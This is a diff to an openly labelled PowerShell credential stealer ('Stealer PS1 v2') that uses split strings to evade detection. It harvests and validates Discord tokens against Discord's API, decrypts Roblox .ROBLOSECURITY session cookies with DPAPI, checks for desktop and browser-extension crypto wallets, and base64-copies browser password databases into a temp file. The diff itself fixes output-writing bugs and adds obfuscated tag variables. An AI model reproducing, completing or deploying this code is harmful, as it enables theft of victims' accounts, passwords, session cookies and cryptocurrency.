@@ -1,5 +1,5 @@
-# Obfuscated stealer — no plaintext signatures
-# All strings split, variables randomized
+# Stealer PS1 v2 - fixed string concatenation in Add-Content
+# Tags stored in variables to avoid PowerShell parsing issues
 
 Add-Type -AssemblyName System.Security
 $c0=@"
@@ -20,6 +20,13 @@ Add-Type -TypeDefinition $c0 -Language CSharp
 
 $f0=Join-Path $env:TEMP ("s"+"r.txt")
 Remove-Item $f0 -EA SilentlyContinue
+
+# Output tags (split for obfuscation)
+$tD="D"+"ISCORD"
+$tR="R"+"OBLO"+"X"
+$tRM="R"+"OBLO"+"XMS"
+$tW="W"+"ALLET"
+$tP="P"+"ASSW"+"ORD"
 
 # Master key from Discord Local State
 $m0=$null
@@ -60,12 +67,15 @@ foreach($p1 in $d0){
     }
 }
 
-# Validate tokens
+# Validate tokens and write output
 foreach($t2 in $t0.Keys){
     try{
         $a0="http"+"s:/"+"/d"+"isc"+"ord.c"+"om/api/v9/users/@me"
         $r1=Invoke-RestMethod $a0 -Headers @{'Authorization'=$t2} -TimeoutSec 5
-        if($r1.username){Add-Content $f0 ("D"+"ISCORD")+"|$($r1.username)|$($r1.email)|$($r1.phone)|$($r1.id)|$t2"}
+        if($r1.username){
+            $line="$tD|$($r1.username)|$($r1.email)|$($r1.phone)|$($r1.id)|$t2"
+            Add-Content $f0 $line
+        }
     }catch{}
 }
 
@@ -85,14 +95,14 @@ foreach($p2 in $rp0){
             $d1=[Security.Cryptography.ProtectedData]::Unprotect($e1,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
             $c1=[Text.Encoding]::UTF8.GetString($d1)
             if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*(_[^;\s]+)'){
-                Add-Content $f0 ("R"+"OBLO"+"X")+"|$($Matches[1])"
+                Add-Content $f0 "$tR|$($Matches[1])"
             }elseif($c1 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
-                Add-Content $f0 ("R"+"OBLO"+"X")+"|$($Matches[0])"
+                Add-Content $f0 "$tR|$($Matches[0])"
             }else{
-                Add-Content $f0 ("R"+"OBLO"+"X")+"|$($c1.Substring(0,[Math]::Min(500,$c1.Length)))"
+                Add-Content $f0 "$tR|$($c1.Substring(0,[Math]::Min(500,$c1.Length)))"
             }
         }elseif($r2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')){
-            Add-Content $f0 ("R"+"OBLO"+"X")+"|$r2"
+            Add-Content $f0 "$tR|$r2"
         }
     }catch{}
     break
@@ -112,11 +122,11 @@ if(Test-Path $p3){
                 $d2=[Security.Cryptography.ProtectedData]::Unprotect($e2,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
                 $c2=[Text.Encoding]::UTF8.GetString($d2)
                 if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*(_[^;\s]+)'){
-                    Add-Content $f0 ("R"+"OBLO"+"XMS")+"|$($Matches[1])"
+                    Add-Content $f0 "$tRM|$($Matches[1])"
                 }elseif($c2 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
-                    Add-Content $f0 ("R"+"OBLO"+"XMS")+"|$($Matches[0])"
+                    Add-Content $f0 "$tRM|$($Matches[0])"
                 }else{
-                    Add-Content $f0 ("R"+"OBLO"+"XMS")+"|$($c2.Substring(0,[Math]::Min(500,$c2.Length)))"
+                    Add-Content $f0 "$tRM|$($c2.Substring(0,[Math]::Min(500,$c2.Length)))"
                 }
             }
         }catch{}
@@ -133,8 +143,8 @@ $br0=@(
 ("$env:LOCALAPPDATA\Bra"+"veSoft"+"ware\Brave-Browser\User Data"),
 ("$env:APPDATA\Op"+"era S"+"oftware\Opera Stable")
 )
-foreach($n0 in $w0.Keys){if(Test-Path $w0[$n0]){Add-Content $f0 ("W"+"ALLET")+"|$n0|de"+"sktop"}}
-foreach($n1 in $w1.Keys){foreach($b1 in $br0){$e3=Join-Path $b1 ("Def"+"ault\Lo"+"cal Ext"+"ension Set"+"tings\"+$w1[$n1]);if(Test-Path $e3){Add-Content $f0 ("W"+"ALLET")+"|$n1|br"+"owser";break}}}
+foreach($n0 in $w0.Keys){if(Test-Path $w0[$n0]){Add-Content $f0 "$tW|$n0|desktop"}}
+foreach($n1 in $w1.Keys){foreach($b1 in $br0){$e3=Join-Path $b1 ("Def"+"ault\Lo"+"cal Ext"+"ension Set"+"tings\"+$w1[$n1]);if(Test-Path $e3){Add-Content $f0 "$tW|$n1|browser";break}}}
 
 # Browser password DBs
 $browsers=@(
@@ -156,15 +166,15 @@ foreach($b2 in $browsers){
         $ms=New-Object IO.MemoryStream;$s1.CopyTo($ms);$s1.Close()
         [IO.File]::WriteAllBytes($tmp,$ms.ToArray());$ms.Close();$copied=$true
     }catch{}
-    if(!$copied){Add-Content $f0 ("P"+"ASSW"+"ORD")+"|$($b2.N0)|LO"+"CKED||";continue}
+    if(!$copied){Add-Content $f0 "$tP|$($b2.N0)|LOCKED||";continue}
     try{
         $rb=[IO.File]::ReadAllBytes($tmp)
         if($rb.Length -gt 800000){
-            Add-Content $f0 ("P"+"ASSW"+"ORD")+"|$($b2.N0)|TO"+"O_LARGE|$($rb.Length)|"
+            Add-Content $f0 "$tP|$($b2.N0)|TOO_LARGE|$($rb.Length)|"
         }else{
             $b64=[Convert]::ToBase64String($rb)
-            Add-Content $f0 ("P"+"ASSW"+"ORD")+"|$($b2.N0)|RA"+"W_DB||$b64"
+            Add-Content $f0 "$tP|$($b2.N0)|RAW_DB||$b64"
         }
-    }catch{Add-Content $f0 ("P"+"ASSW"+"ORD")+"|$($b2.N0)|RE"+"AD_ERROR||"}
+    }catch{Add-Content $f0 "$tP|$($b2.N0)|READ_ERROR||"}
     Remove-Item $tmp -Force -EA SilentlyContinue
 }
